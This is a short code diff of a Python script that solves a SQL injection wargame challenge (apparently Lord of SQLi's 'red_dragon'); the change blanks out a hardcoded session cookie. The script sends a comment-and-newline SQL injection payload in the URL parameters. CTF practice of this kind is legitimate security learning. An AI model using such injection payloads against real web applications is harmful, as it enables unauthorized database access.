@@ -2,7 +2,7 @@ import requests
 
 def sqli(size):
     url = 'https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php'
-    cookies = {'PHPSESSID': 'p3fcggsfr1llcdqk1a0164ag5p'}
+    cookies = {'PHPSESSID': ''}
     parameter = f'?id=%27||no>%23&no=%0a{size}'
 
     response = requests.get(url + parameter, cookies=cookies)
